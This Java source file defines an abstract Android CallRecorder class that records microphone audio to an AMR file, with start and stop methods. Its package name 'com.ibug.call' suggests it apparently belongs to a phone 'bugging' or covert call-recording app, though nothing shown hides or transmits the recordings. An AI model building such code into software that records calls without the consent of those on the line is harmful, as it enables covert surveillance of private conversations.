package com.ibug.call;

import static com.ibug.misc.Utils.Tag;
import android.media.MediaRecorder;
import android.util.Log;

public abstract class CallRecorder {

    private MediaRecorder callRecorder = null;

    public MediaRecorder _start(String location) {
        try {
            setOutputLocation(location);
            callRecorder = new MediaRecorder();
            callRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            callRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            callRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            callRecorder.setOutputFile(location);
            callRecorder.prepare();
            callRecorder.start();
            isRecording = true;

        } catch(Exception e) { Log.d(Tag, "CallRecorder <_start>", e); }

        return callRecorder;
    }

    public void _stop() {
        if(isRecording) {
            callRecorder.stop();
            callRecorder.reset();
            callRecorder.release();
            isRecording = false;
        }
    }

    private boolean isRecording;
    protected static String outputLocation;
    public abstract String getOutputLocation();
    public abstract void setOutputLocation(String outputLocation);

}
